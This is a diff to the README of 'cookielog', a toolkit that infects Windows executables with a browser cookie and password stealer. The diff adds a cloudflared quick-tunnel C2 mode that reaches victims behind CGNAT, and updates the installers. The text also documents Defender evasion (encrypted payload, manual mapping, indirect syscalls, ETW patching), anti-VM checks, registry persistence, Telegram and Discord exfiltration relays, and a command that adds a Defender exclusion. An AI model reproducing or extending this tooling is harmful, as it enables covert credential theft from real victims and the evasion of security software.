@@ -83,6 +83,9 @@ python auto.py "C:\path\to\target_folder" --run
 
 :: CLI -- infect a standalone .exe (output to ifec/apps/)
 python auto.py "C:\path\to\target.exe"
+
+:: C2 over a public https URL with no port-forward (cloudflared quick tunnel)
+python auto.py "C:\path\to\target.exe" --tunnel
 ```
 
 `auto.py` does everything automatically:
@@ -137,33 +140,43 @@ Details and platform support table: [Linux (attacker machine)](#linux-attacker-m
 
 ## Installation
 
-### Windows -- `install.bat`
+### Windows -- `install.bat` / `install.ps1`
 
 ```bat
-install.bat              :: install everything (Python, MSVC, CLI tools, build)
-install.bat --check      :: check what's installed (don't install anything)
-install.bat --no-build   :: skip MSVC + build (Python + CLI tools only)
+install.bat              :: install everything and verify the box
+install.bat --check      :: report only, exit 1 if something required is missing
+install.bat --no-build   :: skip MSVC + build (Python + CLI tools + cloudflared)
 install.bat --no-tools   :: skip CLI tools (fzf, bat, ripgrep, clink)
+install.bat --no-tunnel  :: skip the cloudflared download
 ```
 
 What it does:
 
-1. **Python pip packages** -- `cryptography`, `websocket-client` from `requirements.txt`
-2. **MSVC Build Tools 2022** -- C++ workload via winget (~2 GB download, needed only to
-   compile the payload with `build.bat`; the Python tools work without it)
-3. **CLI tools** -- Clink (cmd autocomplete), fzf, bat, ripgrep -- via winget
-4. **cmd_init.cmd** -- copies to `%USERPROFILE%\bin\` and sets the `AutoRun` registry key so
+1. **Python** -- proves `python` actually runs (the Microsoft Store alias resolves but exits
+   9009), installs 3.14 via winget when missing
+2. **Python pip packages** -- `cryptography`, `websocket-client` from `requirements.txt`
+3. **Toolchain** -- finds MSVC Build Tools 2022 at any of the standard VS locations or a
+   `clang-cl` in PATH / `%USERPROFILE%\toolchain`; installs the C++ workload via winget when
+   neither is present
+4. **CLI tools** -- Clink (cmd autocomplete), fzf, bat, ripgrep -- via winget
+5. **cmd_init.cmd** -- copies to `%USERPROFILE%\bin\` and sets the `AutoRun` registry key so
    Linux-style aliases (`ls`, `cat`, `grep`, etc.) load on every cmd.exe start
-5. **Build** -- runs `build.bat` to compile `loader.exe` + `ckdll.dll` (if MSVC is available)
+6. **cloudflared** -- the `--tunnel` transport, downloaded to
+   `%LOCALAPPDATA%\cloudflared\cloudflared.exe`
+7. **Build + verify + tests** -- `build.py all` when `bin/` is incomplete, then `build.py
+   verify` (artifacts + patchable slots) and the 24 unit tests
+
+`install.ps1` is the same flow for a shell or CI: `-Check`, `-Build`, `-NoBuild`, `-NoTunnel`.
 
 After installation, start cookielog with `auto.bat` (shortcut for `python auto.py`).
 
 ### Linux / macOS / Git Bash -- `install.sh`
 
 ```bash
-./install.sh              # install everything (python3, pip, tkinter, CLI tools)
-./install.sh --check      # check what's installed (don't install anything)
+./install.sh              # install everything and verify the box
+./install.sh --check      # report only, exit 1 if something required is missing
 ./install.sh --no-tools   # skip CLI tools (fzf, bat, ripgrep)
+./install.sh --no-tunnel  # skip the cloudflared download
 ```
 
 What it does:
@@ -174,6 +187,10 @@ What it does:
    environments (Debian 12+/Ubuntu 23+/Fedora): plain install -> `--user` ->
    `--break-system-packages` -> venv instructions
 3. **CLI tools** -- fzf, bat, ripgrep, via the same package manager
+4. **cloudflared** -- `linux-amd64` or `linux-arm64` from the official release, installed to
+   `~/.local/bin/cloudflared` (warns when that directory is not in `PATH`)
+5. **Verify** -- imports `auto` + `c2auth`, and runs `build.py verify` against the prebuilt
+   `bin/` so a broken or missing payload fails here, not on the victim
 
 There is no build step on Linux by design: the victim-side binaries ship prebuilt in
 `bin/` and infection is a byte append.
@@ -249,6 +266,7 @@ python auto.py --persist                    :: enable registry persistence
 python auto.py --c2 http://1.2.3.4:9400/    :: set C2 URL (external targets)
 python auto.py --no-anti-vm                 :: disable VM/debugger checks (for VM testing)
 python auto.py --find-port                  :: auto-scan for a free port (9400-9500)
+python auto.py --tunnel                     :: C2 over a cloudflared https quick tunnel
 python auto.py --clear-telegram             :: remove Telegram from config
 python auto.py --clear-discord              :: remove Discord from config
 ```
@@ -264,6 +282,7 @@ python auto.py --clear-discord              :: remove Discord from config
 | `--c2 <url>` | Override C2 URL (e.g. `https://c2.example.com/` or `http://PUBLIC_IP:9400/`). `https` uses the payload's schannel transport and defaults to 443. Use when victim is outside your LAN. GUI: "DETECT PUBLIC IP" button |
 | `--no-anti-vm` | Disable VM MAC / debugger / sandbox checks (patch `CKAV0000` -> `CKAV0001`). Use for VM targets |
 | `--find-port` | Scan ports 9400-9500 and use the first free one. Saved to `config.json` |
+| `--tunnel` | Start a `cloudflared` quick tunnel and use its `https://*.trycloudflare.com/` URL as the C2. No VPS, no certificate, no port-forward (works behind CGNAT). Needs `cloudflared`; `install.bat` / `install.sh` fetch it |
 | `--config` | Show saved relay settings and exit |
 | `--clear-telegram` | Remove Telegram token from config.json |
 | `--clear-discord` | Remove Discord webhook from config.json |
@@ -571,6 +590,7 @@ python auto.py "C:\path\to\target_folder" --telegram 7123456789:AAH...:987654321
 cookielog/
 |-- DISCLAIMER            # Educational use disclaimer (read this first)
 |-- install.bat           # One-click dependency installer (Windows)
+|-- install.ps1           # Same flow for a shell/CI: -Check, -Build, -NoTunnel
 |-- install.sh            # One-click dependency installer (Linux/macOS/Git Bash)
 |-- auto.py               # One-click: build + listen + infect + test (GUI + CLI)
 |-- auto.bat              # Shortcut: python auto.py %*
@@ -813,6 +833,24 @@ Exfiltration priority in the payload:
 2. **Named pipe** `\\.\pipe\ck_pipe` -- if `sink.py` is running locally (20 retries, 250ms each).
 3. **Local file** `C:\ProgramData\MediaCache\cache.json` -- final fallback.
 
+### C2 without a VPS -- `--tunnel`
+
+`auto.py --tunnel` starts `cloudflared` in quick-tunnel mode in front of the local listener
+and embeds the resulting `https://<name>.trycloudflare.com/` URL in the payload. Cloudflare
+terminates TLS at its edge and forwards plain HTTP to `127.0.0.1:<port>`, so:
+
+- no domain, no certificate, no VPS, and **no inbound port** -- it works from a CGNAT line
+  where port-forwarding is impossible;
+- the payload still runs its own schannel handshake against a publicly trusted chain, so
+  the TLS path is exercised end to end, not emulated;
+- `listen.py` is untouched (plain HTTP on the loopback side); cookies, passwords, session
+  split, chunking and the `/health` probe all behave as they do locally.
+
+The URL is printed when the tunnel is up and is only embedded after `https://.../health`
+answers through it. The tunnel lives as long as `auto.py`; killing it drops late victims,
+exactly like killing a VPS listener. Quick tunnels are ephemeral and rate-limited -- for a
+long engagement use a named tunnel or the VPS path in `deploy/vps/`.
+
 ### CRT-less payload DLL
 
 `ckdll.dll` is built without the C runtime to stay small and easy to map:
@@ -1000,6 +1038,8 @@ must never kill the loader while the payload is working.
 | Password values have 32 bytes of binary garbage at the start | Old v3 fix unconditionally stripped 32 bytes from all v10 values, including passwords | Fixed in v4 (DecCookie only strips when SHA256(host_key) matches). Rebuild with `build.bat` |
 | Windows Defender detects the infected exe as a virus | Payload DLL was plaintext in `loader.exe`; injection imports were in the IAT; the injection chain is a known signature | Fixed in v5: payload is XOR-encrypted in `payload.h`; v13 removes the hollowing chain entirely (manual map, indirect syscalls, ETW patch). Rebuild with `build.bat` |
 | Victim on external network returns no data | `detect_ip()` returns a LAN address (192.168.x.x); the victim cannot reach it | Use `--c2 http://YOUR_PUBLIC_IP:PORT/` or the GUI "DETECT PUBLIC IP" button. Port-forward the listener port on your router. A NAT warning is printed when a private IP is detected |
+| CGNAT / no port-forward, victim outside the LAN | The ISP hands out a shared public IP, so forwarding the listener port is impossible | `python auto.py game.exe --tunnel` -- cloudflared dials out and the payload posts to the public `https://*.trycloudflare.com/` URL; nothing binds to the WAN |
+| `--tunnel` stops with `cloudflared not found` | The binary is not at `%LOCALAPPDATA%\cloudflared\cloudflared.exe` (Windows) or `~/.local/bin/cloudflared` (Linux) | Re-run `install.bat` / `./install.sh`, or set `CLOUDFLARED=/path/to/binary`. A quick tunnel also needs outbound 443 to Cloudflare |
 | Payload doesn't run in VMware / VirtualBox | Anti-VM checks (MAC prefix, `IsDebuggerPresent`, analysis process names) detect the VM and exit | Use `--no-anti-vm` (CLI) or check "Disable anti-VM" (GUI) to patch `CKAV0000` -> `CKAV0001` |
 | `inet_addr` / `connect` fails in `cache.log` (DEBUG build) | C2 URL was not patched (sentinel still `CKC2_DEADBEEF_`) or wrong IP/port | Verify `auto.py` patched the loader sentinel; check the C2 URL with the GUI "TEST C2" button |
 | **Payload/exe dies silently mid-run on the test machine** -- exit `0xC0000005`, no exception handler fires, the point of death moves between runs after every rebuild | Defender behavioral ML (`Behavior:Win32/DefenseEvasion.A!ml` -- the manual-map/syscall chain itself) plus a cloud verdict on fresh `loader.exe` builds (`Trojan:Win32/Bearfoos.B!ml`) kills the process; it is the technique, not a payload bug | Add the repo folder to Defender exclusions once (admin): `powershell -command "Start-Process powershell -Verb RunAs -ArgumentList '-command Add-MpPreference -ExclusionPath C:\path\to\cookielog'"`. Confirmed via `Get-WinEvent Microsoft-Windows-Windows Defender/Operational` ids 1116/1117 |
@@ -1035,7 +1075,8 @@ Full version history in **[CHANGELOG.md](CHANGELOG.md)**.
 
 | Version | Highlights |
 |---|---|
-| **v14** (current) | Key stage gated on a directory write probe instead of the process token: per-user Chromium installs (Vivaldi, Brave, per-user Chrome) unwrap app-bound keys at medium IL; the fodhelper/computerdefaults ms-settings bypass was implemented, tested and removed (Defender `Behavior:Win32/UACBypassExp.T!gen` kills the loader itself) |
+| **v15** (current) | `--tunnel`: C2 over a `cloudflared` quick tunnel (public https, no VPS/domain/port-forward, works behind CGNAT); installers rebuilt -- `cloudflared` step, correct exit-code handling, import-based dependency checks, post-install `build.py verify` + 24 tests, `-Check` modes that return nonzero |
+| **v14** | Key stage gated on a directory write probe instead of the process token: per-user Chromium installs (Vivaldi, Brave, per-user Chrome) unwrap app-bound keys at medium IL; the fodhelper/computerdefaults ms-settings bypass was implemented, tested and removed (Defender `Behavior:Win32/UACBypassExp.T!gen` kills the loader itself) |
 | v13 | Self-injection: payload mapped into loader.exe (no notepad hollowing), indirect `Nt*` syscalls from ntdll SSNs + `syscall; ret` gadget, `EtwEventWrite` patch, header wipe, `MicrosoftSignedOnly` mitigation, `.pdata` registration, base-relocation fallback; `auto.py`/`pick.py` wait for payload completion |
 | v12 | TLS 1.2 C2 in the payload (schannel, chain + hostname validation, caller-owned token buffers), record-boundary chunking with per-chunk `200` ACKs, listener `--tls-cert/--tls-key`, https-aware `auto`/`c2auth`, VPS bootstrap TLS default |
 | v11 | v20 key stage folded into the loader: embedded `ckdec` helper, CLSID discovery, elevated gate, non-elevated skip |
